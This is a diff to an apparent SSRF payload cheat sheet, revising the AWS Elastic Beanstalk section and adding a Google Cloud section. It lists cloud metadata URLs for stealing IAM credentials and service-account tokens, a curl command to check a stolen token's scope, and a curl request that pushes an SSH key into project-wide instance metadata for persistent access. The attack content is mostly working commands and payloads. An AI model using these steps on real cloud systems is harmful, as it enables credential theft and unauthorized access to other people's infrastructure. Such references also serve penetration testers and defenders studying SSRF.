@@ -388,14 +388,14 @@ E.g2: Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.c
 
 ### SSRF URL for AWS Elastic Beanstalk
 
-We retrieved the `accountId` and `region` from the API.
+We retrieve the `accountId` and `region` from the API.
 
 ```powershell
 http://169.254.169.254/latest/dynamic/instance-identity/document
 http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
 ```
 
-We then retrieved the `AccessKeyId`, `SecretAccessKey`, and `Token` from the API.
+We then retrieve the `AccessKeyId`, `SecretAccessKey`, and `Token` from the API.
 
 ```powershell
 http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
@@ -403,7 +403,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbean
 
 ![notsosecureblog-awskey](https://www.notsosecure.com/wp-content/uploads/2019/02/aws-cli.jpg)
 
-Then use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.
+Then we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.
 
 
 ### SSRF URL for Google Cloud
@@ -438,6 +438,36 @@ Interesting files to pull out:
 - Get Access Token : `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
 - Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`
 
+#### Add an SSH key
+
+Extract the token
+
+```powershell
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
+```
+
+Check the scope of the token
+
+```powershell
+$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  
+
+{ 
+        "issued_to": "101302079XXXXX", 
+        "audience": "10130207XXXXX", 
+        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
+        "expires_in": 2443, 
+        "access_type": "offline" 
+}
+```
+
+Now push the SSH key.
+
+```powershell
+curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
+-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
+-H "Content-Type: application/json" 
+--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
+```
 
 ### SSRF URL for Digital Ocean
 
